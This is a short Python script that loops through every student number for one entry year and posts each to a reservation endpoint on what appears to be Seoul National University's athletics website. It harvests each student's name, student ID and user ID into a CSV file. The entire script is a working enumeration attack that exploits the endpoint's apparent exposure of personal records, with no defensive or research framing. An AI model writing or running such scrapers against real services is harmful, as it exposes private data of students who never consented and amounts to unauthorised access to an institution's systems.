#get 2022 data
import requests

YEAR = 2018

student_name = []
student_id = []
user_id = []

for a in range(10):
    for b in range(10):
        for c in range(10):
            for d in range(10):
                try:
                    member_userno = str(YEAR) + "-1" + str(a*1000 + b*100 + c*10 + d)
                    param = {'mode':'attendance','member_userno': member_userno}
                    response = requests.post("https://athletics.snu.ac.kr/facility/reservation?mode=form&facility_idx=2&date=2022-04-22", data = param).json()
                    if(response["errcode"] == 1):
                        continue
                    student_id.append(response["userno"])
                    student_name.append(response["name"])
                    user_id.append(response["userid"])
                except:
                    print("error has occured on: ",member_userno)
        print(10*a + b, "%")
print("done!")

import pandas as pd

data = pd.DataFrame(list(zip(student_name, student_id, user_id)),columns =['name', 'student_id', 'user_id'])
data.to_csv("student_data_"+str(YEAR)+".csv")
